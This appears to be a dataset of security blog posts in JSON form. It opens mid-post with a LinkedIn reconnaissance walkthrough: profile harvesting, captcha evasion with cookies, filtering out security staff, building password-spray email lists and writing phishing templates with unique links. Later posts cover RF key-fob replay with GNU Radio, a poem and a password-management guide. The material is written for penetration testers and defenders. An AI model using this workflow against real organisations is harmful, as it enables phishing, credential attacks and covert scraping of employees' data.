profile while using a new account with zero connections. First, I\u2019ll export my credentials to an environment variable (creds) in colon-delimited format (username:password) and run the harvest command (aliased to \u201ch\u201d for short). We can see that a health 338 profiles are returned right off.\n\nNote: LinkedIn recently began prompting with captchas and the like. You can work around this using the \u201c--cookies\u201d flag, which expects one or more file names containing an array of JSON objects representing name-to-value cookie pairs from an authenticated session, like:   [{\u201cname\u201d:\u201dcookie_name_here\u201d, \u201dvalue\u201d:\u201dcookie_value_here\u201d}]. This should work around the captcha for the moment, and I\u2019ll likely add a jitter capability in the future.\n\n Peasant: Harvested Information from 338 Profiles\n\nNext, I\u2019ll spoof one of the Microsoft profiles that I can view. To protect the innocent, I\u2019ve omitted the profile identifier and elected not to take a screen capture of the results. Running the harvest subcommand returns an additional 40 profiles this time.\n\n Peasant: Spoofing Accessible Profile\n\n Peasant: Harvesting an Additional Forty Profiles\n\nNot too bad, but we can do better by getting some connection requests sent out to target profiles using the add_contacts subcommand while setting the \u201c-if\u201d flag to point at our output CSV file. At least one person accepted the connection request within a minute of sending these out. Harvesting after gaining these connections yielded an additional 662 profiles.\n\n Peasant: Sending Connection Requests from CSV\n\n LinkedIn: Two Additional Requests Accepted\n\n Peasant: Harvesting Additional Profiles\n\nTwo requests were accepted within the hour, allowing me to capture profile information from a total of 1,842 accounts.\n\n Peasant: Harvesting Additional Contacts (Total 1,842) \n\nWorking with the Output\n\nThe CSV output generated by Peasant contains several interesting fields we can use when selecting targets for social engineering and crafting inputs for password attacks. Here are the CSV columns for reference:\n\nfirst_name\n\nlast_name\n\noccupation\n\npublic_identifier\n\nindustry\n\nlocation\n\nentity_urn\n\ncompany_name\n\ncompany_id\n\nconnection_requested\n\nFinding Interesting Roles\n\nawk is your friend if you want to grep out security roles (occupations), which may help you avoid starting a fire by sending connection requests to individuals with a heightened level of awareness: awk -F ',' '{print $3}' microsoft.csv|sort -u|grep -vi security. Now you can iterate over each of these roles and use grep with the inverse flag to filter them from the CSV file. Use the reverse of this technique to identify key roles you may be interested in targeting for social engineering attacks. \n\n Extracting Occupations Containing the String \u201csecurity\u201d \n\nCrafting a List of Emails for Password Spray Attacks\n\nI\u2019m partial to another silly project of mine called Parsuite and the templatizer module for crafting user lists and the like, which accepts and mangles CSV input to return new CSV output containing crafted values. Support for random value generation and basic \u201cencoding\u201d of outputs is available as well.\n\nWe\u2019d use the following command to generate a list of email addresses in {first_letter_first_name}{last_name}@microsoft.com format. If the template structure looks confusing, clone a copy of Parsuite and run the help command for the templatizer module to get more information. \n\nparsuite templatizer -tts \\\n'<<<:first_name[1]:lowercase_encode>>><<<:last_name:lowercase_encode>>>@microsoft.com' \\\n-csv microsoft.csv\n\nParsuite Command to Craft Email Addresses\n\n Parsuite: Crafting Email Addresses from Peasant Output\n\nCrafting Email Addresses and Content for Phishing Campaigns\n\nThe templatizer module can accept files containing text templates as well, so you could also generate emails containing unique links and identifiers to support a phishing campaign.\n\nHello <<<:first_name:>>>,\n\nYou should unqestionably click this link: https://my.evillanding.com?id=<<<:RAND:>>>\n\nText Email Template\n\nparsuite templatizer --csv-file microsoft.csv -tts \\\n'<<<:first_name[1]:lowercase_encode>>><<<:last_name:lowercase_encode>>>@microsoft.com'  \\\nemail_template.txt\n\nFinal Parsuite Command\n\n Parsuite: Generating Emails with Unique Links\n\nNow you can pass this output to any tool that\u2019ll accept CSV files as input. I\u2019ve recently used SendGrid as a mail delivery service, which is supported by another tool I\u2019ve thrown together and can run right with this file format.\n\nDefender Recommendations\n\nFirst and foremost, be sure to incorporate content into your security awareness training communicating that threat actors use social media as a phishing message delivery platform and how users should exercise good judgment when interacting with Interplebeians. It\u2019s becoming increasingly difficult to land phishing emails in target inboxes due to technical controls but getting a direct line of messaging through social media is always going to be easy since our brains are primed to drop a dopamine fog-bomb each time a like or friend request is received.\n\nSecond, I recommend creating several LinkedIn accounts and joining them to your Company profile. You can then monitor them on occasion to see if they each received invitation requests from the same account in a short period of time, an indicator that you\u2019re being targeted for reconnaissance. Do some due diligence to determine if the activity is malicious and consider reporting the account to LinkedIn. I realize this isn\u2019t the most practical recommendation but company admins have minimal control over who can join a company profile.\n\nBonus Vulnerability Discovery\n\nA previously unknown access control flaw was identified in LinkedIn while developing the image spoofing capability of Peasant. I initially tried to take the URN identifier of the profile/background image configured in a foreign profile and copied it to my evil profile. The advantage of this approach is that it eliminated several API calls and dealing with the binary content of pictures. The unintended consequence was that deleting the pictures from my profile also deleted the image and URN itself, which resulted in the picture no longer being available for the foreign profile - thus causing the foreign profile to display the default profile picture.\n\nI worked directly with LinkedIn\u2019s security team to remediate the vulnerability over the Thanksgiving holiday. Kudos to them for the prompt response.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"GNU Radio Primer\"\nTaxonomies: \"Author, Hardware Hacking, How-To, Informational, Physical, Ray Felch, GNURadio, Hackrf, Raymond Felch, SDR\"\nCreation Date: \"Mon, 09 Dec 2019 15:40:06 +0000\"\nRay Felch //\n\nDisclaimer: Be sure to use a faraday bag or cage before transmitting any data so you don\u2019t accidentally break any laws by illegally transmitting on regulated frequencies. Additionally, intercepting and decrypting someone else\u2019s data is illegal, so be careful when researching your traffic.\n\nPreface: \n\nRecently, I introduced myself to the world of SDR (Software Defined Radio) and admittedly learned a great deal in the process. I discovered that not only could I emulate actual radio-frequency (RF) hardware components using various software applications such as SDR Sharp, GQRX, SIGINTOS, CubicSDR, RTL-SDR supported software, etc, I could also use GNU Radio flow graphs such as 'grgsm_livemon.grc' to capture GSM mobile network packets live in the wild.\n\nAs informative and educational as this project was, I wanted to understand GNU Radio flow graphs in greater detail. I wanted to know the basics of creating these flow graphs, rather than just relying on using preexisting flow graphs without fully understanding why (or how) it worked.\n\nAlthough there is quite a bit of documentation available on the internet, GNU Radio (and GNURADIO-COMPANION) can still be a bit daunting and intimidating when first approached. After doing a few Google searches, I eventually stumbled upon some online lessons provided by Michael Ossmann of Great Scott Gadgets and I found that this helped me tremendously.  https://greatscottgadgets.com/sdr/  Also, the GNU Radio Tutorials https://wiki.gnuradio.org/index.php/Tutorials helped to reinforce what I had just learned.\n\nIn order to familiarize myself with the basics of GNU Radio, I chose a project that might be used with regard to replay attacks (finding, capturing, and replaying a raw RF signal), to unlock my 1999 Ford Mountaineer bypassing the FOB (frequency operated button).\n\nIt needs to be stated upfront, that although I was able to capture the unlock signal from my FOB and replay that signal (transmitted using the HackRF), it did not actually unlock my vehicle. The reason for this is because changes were made, many years ago, to help prevent these replay attacks, using a technique known as 'rolling code' (sometimes referred to as 'hopping code'). \n\nPrior to this change, vehicles and garage door openers used fixed codes and were susceptible to being discovered by an attacker with the appropriate receiver. This information could be used by the attacker to gain access sometime later. At the time of this write-up, there have been numerous mentions of a rolling code work-around, including using jamming techniques and code reset techniques.\n\nRegardless, I found that working through the project was worth the effort. It provided me with a better understanding of GNU Radio and the knowledge required to create my very own working flow graphs.\n\nBasic GNU Radio and Flow Graph Information: \n\nAll signal processing in GNU Radio is done using flow graphs, comprised of individual blocks that perform one digital signal processing operation, such as filtering, decoding, multiplexing, etc.\n\nThis data passes between these blocks in various formats, complex or real integers, floats or basically any kind of data type that you define.\n\nEvery flow graph needs at least one source block (input) and one sink block (output).\n\nA source or sink might be a USB dongle HackRF, BladeRF, etc), a sound card, a file or an fft (Fast Fourier transform), just to name a few. https://en.wikipedia.org/wiki/Fast_Fourier_transform\n\nObtaining my FOB specific information: \n\nIn order to determine the operating frequency of my FOB, I first searched for the FCC number associated with my vehicle. A Google search, followed by an FCC search provided the following information:\n\nThe FCC search results provided the frequency I was looking for:\n\nArmed with the RF frequency of my device (315Mhz), it was time to attempt a capture of the 'unlock vehicle' signal. Normally, I could have used one of the many available apps (SDR Sharp, etc.) to monitor for, and capture the raw data, however this time I wanted to create the building blocks myself using the GNU Radio flow graphs.\n\nI moved into my home projects directory and issued the following command: \n\n$ sudo gnuradio-companion \n\nUpon loading gnuradio-companion, I clicked to create a new flow graph:\n\nNotice that the new flow graph opens with two blocks already defined as Options and Variable.  The Options (ID: top_block) defines the tool-chain library that we'll be using: QT-GUI, WX-GUI, none, hier block, etc. and the Variable block (ID: samp_rate) is established to allow us to choose our signal sample-rate, defaulted to 32ksps (32 thousand samples per second).\n\nNote: Right-mouse-click on any block to display the properties and to modify its parameters.\n\nI'll be using the HackRF (supported by the osmocom Source block), and the recommended minimum sample-rate when using the HackRF is 2M samples per second.  I can select the osmocom Source by finding it and double-clicking on it in the list.\n\nAt this point, I might want to change the sample rate variable from the default 32k (32e3) to 2M (2e6). Any block in the flow graph that specifies the variable 'samp_rate' will now use the new (edited) value.\n\nIt would also be very helpful to have a variable for the desired (target) RF center frequency of 315Mhz (315e6). This can be accomplished easily by copying and pasting the 'samp_rate' variable block, and naming the new variable block 'center_freq'. \n\nI can now right-mouse-click on my osmocom Source block, and change the default CH0 frequency (100e6) to now be the variable 'center_freq'. My flowgraph now looks like this:\n\nNotice that the two variables 'samp_rate' and 'center_freq' values are now being followed by the osmocom Source block. Defined variables come in very handy as flow graphs grow in size and readability becomes obscured. \n\nAlso, notice the blue colored output of the osmocom Source. The color blue indicates a complex value (real and imaginary) that will be provided at its output. If the output color were orange, then the output would be a real value (integer, float, absolute, etc). This is an important concept to be aware of. Input and output colors must match or an error will be thrown. Mismatches can be corrected by editing the Output Type or Input Type property of the offending block.\n\nAnd lastly, notice that osmocom Source (ID) is displayed in red letters. GNU Radio uses red to indicate an error in the flow graph. In this case, the error is pertaining to the Source block missing its output connection. This will be satisfied when I add the output (sink) block and connect the two blocks together.\n\nCreating the sink: \n\nTo complete my \"preliminary\" flow graph I need to add an FFT Sink so that I can monitor the signal activity and ensure that everything is working as expected. This can be accomplished by choosing the QT-GUI Frequency Sink block under Instrumentation.  I need to enter the properties window and specify the variable 'center_freq' as the Center Frequency parameter. Also, I need to connect the output of osmocom Source to the input of QT-GUI Frequency Sink.\n\nTo execute my flowgraph I click the green Execute button. \n\nNote: To stop execution click the red 'X' to the right of the green Execute button\n\nThis should open an FFT window displaying the 315MHz RF signal being received by the HackRF.\n\nAt this point, I can see that the flow graph is sampling a bandwidth of 2MHz with a center frequency of 315MHz. So far, it appears that the flow graph is working as expected. \n\nNext, I would like to be able to press the 'unlock' button on my FOB and display the resultant signal. This can be accomplished using the same flow graph, but first I need to go into the running FFT window and click the center button on the mouse. This opens a drop-down menu where I can select 'Max Hold'. This feature will display any signal that is higher than the current signal being displayed.\n\nExecuting my flow graph with Max Hold enabled results in the following display when I click the FOB button:\n\nCapturing the FOB unlock signal for replay: \n\nIn order to capture the resultant FOB generated signal and save it to a file, I needed to include another Sink block (output) to my flow graph. This new block can be found under File Operators and is called File Sink.  Right-mouse-clicking allows me to open the properties window and enter a filename for the captured raw data. I chose to name this file 'fob_capture'. \n\nNote: These files can get quite large very quickly, as we will be sampling 2 million samples per second using floating-point notation. For this reason, I will execute the flow graph, click the FOB button, and then stop the flow graph as quickly as possible.\n\nMy modified flowgraph now looks like this:\n\nExecuting the flow graph and capturing the FOB signal results in a 49.3M byte raw file.\n\nDirectory listing:\n\n-rw-r--r-- 1 root    root 49311744 Nov 10 21:06 fob_capture\n\nReplaying the FOB signal from the captured file: \n\nNote: In GNU Radio, we can disable blocks from being executed by right-mouse-clicking the block and selecting 'Disable' from the drop-down menu. This will display the block as grayed out indicating that the block is temporarily removed from the flow graph execution.\n\nTo replay the captured signal we might have normally created an entirely new flow graph, however, to demonstrate the 'Disable block' feature, I decided to just disable the osmocom Source, QT GUI Frequency Sink, and File Sink blocks. After being disabled, the three blocks are now grayed out.\n\nNext, I created a new source block using the File Source block under File Operators. I opened the block properties and entered the name of my previously captured file, 'fob_capture'.\n\nI then created a duplicate (copy and paste) of the previously used QT-GUI Frequency Sink (FFT) block, so that I could watch the signal being replayed.\n\nThe final thing I did was to use an osmocom Sink block to actually transmit the replay signal using the HackRF.\n\nMy modified flowgraph now looks like this:\n\nThe following video (taken with my phone) shows the results of executing this flow graph:\n\nNote: The 'Repeat' parameter in the File Source block indicates that the file will repeat (in an endless loop). Ideally, we would only allow the signal to be played one time in a replay attack, but for demonstration purposes, I chose to repeat the replay.\n\nOther useful GNU Radio information: \n\nIf you have had any previous experience using hardware equipment, such as oscilloscopes, frequency generators, frequency counters, spectrum analyzers, etc., it's good to know that this equipment can be added to your flow graphs to further supplement your project development and testing. \n\nThe following demonstrates using an oscilloscope ( to lock into the actual captured FOB signal at a much lower level, showing the actual digital pulses (making up the code). Although this level of information is not necessarily required for a replay attack, it is good to know the options are available.\n\nAlso notice, I'm using the WX-GUI library to demonstrate using the scope block, rather than the QT-GUI library used earlier. \n\nThrottle block (when and why): \n\nAlso worth mentioning, is the Throttle block which can be found under the 'Misc' category in the list.  The Throttle block is typically attached directly to the output of a \"non-hardware\" source block (Signal Source block, etc), in order to limit the rate at which that source block creates samples. We would use the Throttle block to throttle the flow of samples such that the average rate does not exceed the specified rate (samp_rate). \n\nA throttle block should be used if, and only if, your flow graph includes no rate limiting block, which is typically hardware (SDR dongle, speaker, microphone, etc.). For example, a Throttle block could be used in a flow graph that is simulating actual hardware but with the absence of an actual clock.\n\nIn the following example flow graph, if we remove the Throttle block, the output will look the same, but our CPU will be at 100% and GNU Radio might crash. This is a good example of when to use a Throttle block.\n\nIt should also be noted that the \"throttled\" sampling is not intended to be very accurate in precisely controlling the rate of samples. This needs to be controlled by a source or sink tied to sample clock (USRP or audio card), in which case a Throttle block would not be used. \n\nGenerally speaking, a Throttle block is normally not necessary and should be avoided especially when using a hardware source (USRP, SDR-RTL, etc.) clock. This is because a Throttle block is a bad clock and generally leads to a two-clock problem and potentially very bad results can occur. The rule-of-thumb is if the flow graph has a radio device (USRP, SDR-RTL, etc.) OR audio device (sound card, etc.) connected, DO NOT USE a Throttle block.\n\nSummary: \n\nAs stated at the top, although I was able to capture the unlock signal from my FOB and replay that signal, I still consider the effort a win (even if I didn't actually unlock the vehicle with the replay). \n\nGoing forward, new RF (radio frequency) related projects will, no doubt, present itself. New vulnerabilities will be exposed. Armed with the ability to emulate expensive radio hardware through software (flow graphs), GNU Radio will always be a valuable tool to have in my arsenal.\n\nIt's a cat and mouse game for sure, but thanks to the InfoSec community's constant research and contributions, we can continue to share our knowledge and strive to keep our systems secure.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"'Twas the Week Before Hackmas\"\nTaxonomies: \"Fun & Games, Informational, dakota nelson, hackmas\"\nCreation Date: \"Wed, 18 Dec 2019 21:03:07 +0000\"\nDakota Nelson //\n\n'Twas the week before HackmasAnd all through their housesNot a tester was workingNor moving their mousesThe findings were listed in reports with careIn hopes that bugfixes would soon be thereThe hackers were nestled all snug in their chairsWhile bitstreams of 0day flowed through twisted pairsAnd Heather on her treadmill desk, and John on a plane,Had just muted the testers so they could try to stay sane,When out on the Twitter there arose such a stormThat even the interns were stirred from their dormsAway to the internet, we flew screaming \"WOWZERS\",Ate up all the bandwidth (with our non-BHIS browsers)The moon on the breast of the new-fallen snow,Went totally unnoticed by the hackers belowWhen what to my wondering eyes did a path beat,But a felony libelslander and eight clueless retweetsWith McAfee\u2019s arrival (he has altcoins to sell)I knew in a moment that this would not go wellMore rapid than Oracle vulns the spectators cameAnd the internet raged, and shouted, and shamed:\"No disclosure, no research, no Google vuln dev!\"\"Yes to export control and online conference reg!\"To the top of the feed! to the blogs big and small!Now yell away! yell away! yell away all!As the arguments heated and no-one knew why,I took just a moment, to look at the skyAnd up on the housetop the snowflakes they flew,Lit by festive lights and the blinky ones too -And then, in the blinkenlights, I saw just how prettyThe world could be, in this little cityAs I blinked once or twice and turned back around,I realized my phone wasn't making a sound.It was silent and dark, something big was afoot,The internet was gone, completely kaput!A feed full of tweets flung into the black,May never result in (not so) clever come-backs.My eyes - how they twinkled! my dimples, how merry!As the router's lights blinked just as red as a cherryMy mouth curled upward, becoming a smileAs the snow just kept falling, all of the whileNot a sysadmin now would leave their cozy home(Unless they were out in the snow just to roam)The internet was over, at least for the nightAnd out with it went our crazed Twitter fightWe were back to being what we were all along:A whole bunch of hackers, for right or for wrongAs I turned out the lights and went off to bed,I felt - just for once - I had nothing to dreadSoon we would all return to our work,But for now, there was nowhere for malware to lurkSo laying one finger on a power strip switch,My home office was silenced, the darkness like pitch.With every bit settled, secure for a while,I whistled to bed, with an ear-to-ear smile.I made sure to exclaim, though no-one was in sight -Happy Hackmas to all, and to all a good night! \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The Paper Password Manager\"\nTaxonomies: \"Author, How-To, Informational, Michael Allen, Password Cracking, Michael Allen, Paper Password Manager, password management, passwords\"\nCreation Date: \"Thu, 02 Jan 2020 14:58:26 +0000\"\nMichael Allen //\n\nEvery year around the holidays I end up having a conversation with at least one friend or family member about the importance of choosing unique passwords for each web site or service they use. Usually, it\u2019s after they\u2019ve received a phone or a camera or some other \u201csmart\u201d device for Christmas and have asked me to help them set it up. Most recently, it was when a friend told me his eBay account got hacked, and he asked me how he could keep it from happening again in the future.\n\nI told him that it was likely the attacker found his password in a data breach of another website and then used the password to login to his account on eBay. Then I introduced him to HaveIBeenPwned.com - an online service that tracks data breaches so users can find out if their data has been leaked. We searched the database for his email address and sure enough, his password was stolen in four separate breaches. When I asked him if he used the same password on all his accounts, he said he did.\n\n The HaveIBeenPwned Website Where my Friend\u2019s Data was Found in Four Different Breaches \n\nSuddenly he realized the importance of using a unique password for every different service. Sure, sites like eBay, PayPal, and your bank usually have pretty strong security, but other sites you use might not be so secure. When an attacker steals your password from an insecure website, they can easily use it to log in to every other site where you use the same password.\n\nBut how do I keep track of so many passwords? \n\nExperts often recommend using a password manager to keep track of all the passwords that accumulate as a person creates accounts on different websites. A password manager is typically an app (either for a smartphone or a computer) or a website intended to store all of a user\u2019s passwords in a secure way - usually in an encrypted database. After logging in to the password manager, the user can store and retrieve the passwords they use on other websites. That way instead of having to remember many different passwords, the user only has to remember one password - the password that unlocks their password manager. Then the password manager does the job of remembering all the other passwords for them.\n\n Google\u2019s Security Blog Listed Using a Password Manager Among the Top 5 Practices Recommended by Security Experts \n\nThe problem with computer- or smartphone-based password managers (which I\u2019ll refer to as \u201celectronic password managers\u201d from here onward) is that they require a base level of familiarity and expertise to be used every day. For regular readers of the BHIS blog, using an electronic password manager would likely require little to no effort. But for casual technology users who may not be fluent in all of their devices\u2019 functions, electronic password managers are often difficult to learn and too cumbersome to use regularly.\n\nJust about all of my family members and friends outside of work fall into that second category. Older family members, especially, still ask me to copy and paste files or move pictures from their phone to their computer whenever I come to visit; so for them, recommending an electronic password manager didn\u2019t make sense.\n\nThe Threats Password Managers Face\n\nFor many people keeping track of unique passwords to their personal accounts, writing the passwords down on paper seems like a pretty good solution. It solves the problem of having a different password for every account. But if the list of passwords is carried outside the home, there\u2019s a very real possibility it will be lost or stolen.\n\nEven if the list of passwords never leaves the house, it may still be at risk. I\u2019m amazed how frequently I hear stories of friends, caregivers, children, and even parents who make fraudulent purchases and even steal money outright from the accounts of people who trust them. An ideal solution would also need to keep passwords safe even if it fell into the hands of an untrusted third party.\n\nAfter giving it a little thought, I came up with what I now call the Paper Password Manager.\n\nThe Paper Password Manager\n\nThe Paper Password Manager (PPM) is a simple solution that allows just about anyone to keep track of multiple, unique passwords regardless of their proficiency with a computer. \n\nGranted, it\u2019s not perfect. The user still has to learn the system; and like any system, it isn\u2019t perfectly secure. The purpose of the Paper Password Manager is to be a \u201cgood enough\u201d solution so that if one of a user\u2019s accounts is compromised, all of their other accounts remain secure. And if the Paper Password Manager itself is compromised through loss or theft by an attacker who doesn\u2019t know the key, login credentials to the user\u2019s account are not immediately known - giving the user time to change their passwords before the attacker gains access to their accounts.\n\nThe table below illustrates the relative strength of the Paper Password Manager compared with other password management strategies.\n\n The Resilience of Common Password Management Strategies Compared \n\nAs you can see, the Paper Password Manager is more secure than some of the other common, low-tech solutions to password management. Although it isn\u2019t quite as secure as an electronic password manager, it is simple enough that basic instructions for its use can be summed up in just a few sentences.\n\nIn short, the process can be described as follows:\n\nThe Paper Password Manager is just a handwritten list of the user\u2019s accounts and passwords, with one exception - Instead of writing down the whole password for each account, the user writes down only the first half (what we\u2019ll call the \u201cunique bit\u201d). The second half of the password (called the \u201ckey\u201d) is the same for every account and is not written down. Instead, the key is memorized by the user. To type the password of any account stored in the Paper Password Manager, the user simply types in the account\u2019s unique bit followed by the key. In other words: Account Password = Unique Bit + Key\n\nThis gives the Paper Password Manager the following characteristics:\n\nThe user only has to remember one password - the key - to keep all the passwords in the PPM secure.\n\nSince the PPM is stored on paper and not on a computer, an attacker must have physical access to the PPM to compromise all the accounts it contains.\n\nAn attacker who compromises the complete password to one of the accounts (the unique bit + the key) cannot derive any other complete passwords without gaining access to the PPM.\n\nIf an attacker learns more than one complete password stored in the PPM, they may be able to identify the key, but they still cannot derive any other passwords without access to the PPM.\n\nDetailed instructions for making and using the Paper Password Manager are included in the section below.\n\nDetailed instructions for using the Paper Password Manager\n\nTerms used in the instructions:\n\nTo try and keep things clear throughout this article, I made up the following terms for things that get referred to often. \n\nPaper Password Manager (PPM) - The physical paper media on which all of the user\u2019s account details are written. \n\nKey - The secret password to the PPM that is memorized by the user. The key must not be written down anywhere on the PPM.\n\nUnique Bit - The unique bit is the part of every account password that is written down in the PPM. Together, the unique bit and the key form the password for a given account.\n\nMaterials:\n\nTo make your own Paper Password Manager, you\u2019ll need:\n\nPaper\n\nA pen or pencil\n\nDepending on where you plan to keep your Paper Password Manager (e.g. at your desk, in your pocket, in your wallet, etc.) you might choose a notepad, a folded sheet of paper, or a set of small index cards. Anything with enough space to capture all your login credentials will do. \n\nStep 1 - Choose your key\n\nAfter gathering the materials, the first step in creating your Paper Password Manager is to select its\u2019 key. The key is a password that must be memorized - not written down anywhere in the PPM. You can write it down somewhere else if you like, and I\u2019ll discuss that more in the section on backing up your PPM. When selecting the key, I recommend including at least one uppercase letter, one lowercase letter, and one numeral. The key should also be at least 8-12 characters long.\n\nI don\u2019t recommend including any special characters in the key because, unfortunately, not all websites allow all special characters to be used in passwords. Your key will be part of every password you create, so if you pick a key that isn\u2019t allowed on one website because the site doesn\u2019t allow you to use special characters, you\u2019ll have to make an exception for that site, and that can get confusing. (I do recommend including a special character in the unique bit whenever possible, which we\u2019ll get to later.) \n\nSimilarly, the reason I recommend keys 8-12 characters long is because not all websites allow long passwords. A longer key is always better; just be aware that if you have a longer key, you may need to select a shorter unique bit for any websites that don\u2019t allow long passwords.\n\nHere are some keys I made up as examples along with some details of each. Don\u2019t use any of these keys for your own PPM! Make up your own key so it will be completely secret.\n\nExample Keys\n\n6PackOfCola\t- 11 characters, 3 upper case, 7 lower case, 1 numeral\n\nXmasTr33\t- 8 characters, 2 upper case, 4 lower case, 2 numerals\n\nBillAndTed19\t- 12 characters, 3 upper case, 7 lower case, 2 numerals\n\nStep 2 - Storing an account in your PPM\n\nOnce you\u2019ve selected your key, you\u2019re ready to begin recording account details in your PPM. How you record the information is completely up to you. At a minimum, each entry should probably include:\n\nThe website name or URL (e.g. Amazon, Google.com)\n\nThe email address associated with the account\n\nThe username used to login to your account, if it is different than your email address\n\nThe unique bit of the password to the account\n\nYou might also want to include the phone number associated with the account or other information you provided when you signed up that you might need later. However, don\u2019t include the answers to your security questions in your PPM. I\u2019ll discuss how to store those securely later in the article.\n\nHere\u2019s an example of how an entry for Amazon might look in my PPM:\n\nWebsite: Amazon.comEmail address: michael@example.comUnique bit: ______________\n\nIf you\u2019re following along with these instructions, go ahead and fill in all the information for one of your accounts in your PPM. You won\u2019t be able to fill in the unique bit yet - you\u2019ll do that in the next step.\n\nStep 3 - Generating the unique bit\n\nThe last piece of information to fill in from the previous step is the unique bit. Each account should have its own unique bit since that\u2019s what makes the password for each account unique.\n\nTo generate the unique bit, create another password that\u2019s at least 8 characters long (longer is even better) and includes at least one of each character type - upper case, lower case, numerals, and special characters. If you visit a website that doesn\u2019t allow special characters, you can create a unique bit using only letters and numbers; but for maximum security, include special characters whenever they\u2019re allowed. Also, remember that spaces are often considered special characters and are easy to include between words in the unique bit.\n\nHere\u2019s an example of the Amazon entry in my PPM after creating a unique bit:\n\nWebsite: Amazon.comEmail address: michael@example.comUnique bit: 8 Fluffy Clouds\n\nTIP: You might notice that I use words in my key and unique bit examples instead of scrambling up a bunch of letters. I choose random words instead of individual random letters because words are so much easier to read and to type when I\u2019m entering my password. Copying \u201c8 Fluffy Clouds\u201d from my PPM is much easier than copying \u201c8 uyflFf uldCso\u201d, even though they\u2019re both the same length and contain all of the same characters. Since all of your passwords will be a minimum of 16 characters in length (at least 8 in the unique bit and at least 8 in the key), your passwords will be plenty strong if they contain random words instead of random letters. And they\u2019ll be way easier to type!\n\nStep 4 - Retrieving a password from your PPM\n\nRetrieving a password from an entry in your PPM is very easy. When you enter your password into the website to login, first type the account\u2019s unique bit written in your PPM, and then type your memorized key. \n\nFor example, if the unique bit for the account I was logging into was \u201c8 Fluffy Clouds\u201d and my key was \u201c6PackOfCola\u201d, then the password to my account would be: \u201c8 Fluffy Clouds6PackOfCola\u201d.\n\nTogether, the unique bit and the key give my account a password that is different than all of my other passwords. The password is also 26 characters long and contains all four types of characters, making it extremely difficult for an attacker to guess.\n\n Example of Logging in to Amazon by Combining the Unique Bit and Key \n\nBackups and Disaster Recovery\n\nBecause the Paper Password Manager exists on paper, it\u2019s easy to create backups just by making a copy with a copier or multi-function printer. When backing up the key, the key should be written down separately and stored in a secure location away from the PPM, such as a safe deposit box. \n\nA backup plan for the PPM might look something like this:\n\nPaper Password Manager - Primary copy\n\nCarried in a pocket for daily use\n\nPaper Password Manager - Backup copy\n\nBackup created with a copier every three months\n\nBackup copy stored at home in a fireproof box for easy access\n\nOld backup copies shredded or otherwise securely disposed of when new backups are created\n\nKey\n\nWritten copy of the key stored in safe deposit box\n\nInstructions for using the PPM might also be included if the key should ever need to be used by a family member\n\nAnswers to security questions\n\nAnswers to security questions stored in safe deposit box\n\nSince answers to security questions can be used to reset passwords on accounts, they should not be stored in or with the PPM. Instead, answers to security questions should be stored in a separate location such as the safe deposit box where the PPM key is stored.\n\nOther Tips\n\nHere are some other tips to consider when using the PPM:\n\nUnderline numerals present in usernames or unique bits to keep them from being confused with letters. That way you won\u2019t confuse numbers like 0 and 5 with letters like O and S.\n\nSimilarly, you might also choose to mark spaces in the unique bits with a character or symbol not present on your keyboard, as in: \n\nSelect keys and unique bits that are easy to read and to type. For example, it is usually easier to read and type a password that contains a few randomly selected words than one in which each individual letter has been chosen at random.\n\nDon\u2019t follow any sequence or pattern when selecting unique bits for your accounts. If the unique bit for your Amazon account is \u201cRed2001!\u201d and the unique bit for your Gmail account is \u201cBlue2019@\u201d, an attacker who compromises those passwords could start to make reasonable guesses about what the unique bit for other accounts might be.\n\nFor extra security, consider creating a separate PPM for high-security web sites like bank accounts. Each PPM should have its own unique key if you decide to go this route.\n\nPutting it into action\n\nI hope you found this article valuable and that for you or someone you know, it makes securing your online accounts a little less daunting. Like any new skill, incorporating the Paper Password Manager into your routine may take some practice. To make it a little easier to remember how it works, I created a one-page reference sheet that you can download and optionally print from the link below. \n\nDownload the Paper Password Manager Reference Sheet\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How To Replay RF Signals Using SDR\"\nTaxonomies: \"Author, Hardware Hacking, How-To, Informational, Ray Felch, Raymond Felch, SDR, Software Defined Radio\"\nCreation Date: \"Thu, 23 Jan 2020 17:23:19 +0000\"\n Ray Felch // \n\nSOFTWARE DEFINED RADIO: RF Signal Replay Techniques\n\nDisclaimer: Be sure to use a faraday bag or cage before transmitting any data so you don\u2019t accidentally break any laws by illegally transmitting on regulated frequencies. Additionally, intercepting and decrypting someone else\u2019s data is illegal, so be careful when researching your traffic.\n\nPreface: Recently, I was invited to collaborate with a few of my colleagues (many thanks to BB King for bringing me into his project) regarding the troubleshooting of an RF signal replay lab.\n\nAlthough I owned an inexpensive ($20) RTL dongle and the higher-priced ($350) HackRF One device, I did not possess the Yardstick One ($100) dongle being used in BB King's lab. Furthermore, I was not familiar with a few of the tools (RfCat) and scripts unique to the Yardstick One dongle.\n\nAs you might guess, I immediately ordered the Yardstick One and also purchased an inexpensive ($12) wireless doorbell at a local retail store. While waiting for the delivery of the Yardstick, I decided to power up my HackRF One and attempt to capture the doorbell remote's RF signal and replay it using the HackRF.\n\nRealizing that there are a few different ways to perform RF Signal replay attacks, I decided to document my findings so that others might benefit from what I discovered along the way. Hopefully, armed with this information, the methods can be chosen based upon your needs and the cost, complexity, and versatility of the devices and tools available.\n\nSDR USB Devices:\n\nRTL-SDR - Inexpensive ($20), Receive only (Frequency range: 500KHz to 1.75GHz)\n\nYardstick One - Moderately priced ($100), Receive and Transmit (Frequency range: 300-348MHz, 391-464MHz, and 782-928MHz), Half-Duplex\n\nHackRF One - Higher priced ($350), Receive and Transmit (Frequency range: 1 MHz and 6 GHz), Half-Duplex\n\nBladeRF - Higher priced ($420), Receive and Transmit (Frequency range: 47MHz to 6GHz, 61.44MHz sampling rate, and 2\u00d72 MIMO streaming), Full Duplex\n\nRF Signal Replay examples using a wireless doorbell:\n\nFCC search (https://fccid.io/) of the device FCC Identifier results:\n\nThe RTL-SDR - RF Signal receive and capture using Gqrx: (Note: RTL-SDR can not transmit!)\n\nAfter adjusting the center frequency for optimum gain and clarity (433.89MHz), we can click the \"REC\" radio button and then press the peripheral remote button and ultimately capture the RF signal burst to a file.\n\nObviously, we can not transmit this signal due to the limitations of the RTL-SDR dongle, but the captured file could be transmitted by the Yardstick One or the HackRF, providing we convert the .wav file to a raw file that these devices can recognize. For example, the HackRF requires an 8 bit signed IQ raw file with no header information.\n\nIn addition to GQRX, there many other SDR GUI applications available such as SDRSharp, SIGINTOS, etc. (for more information see my 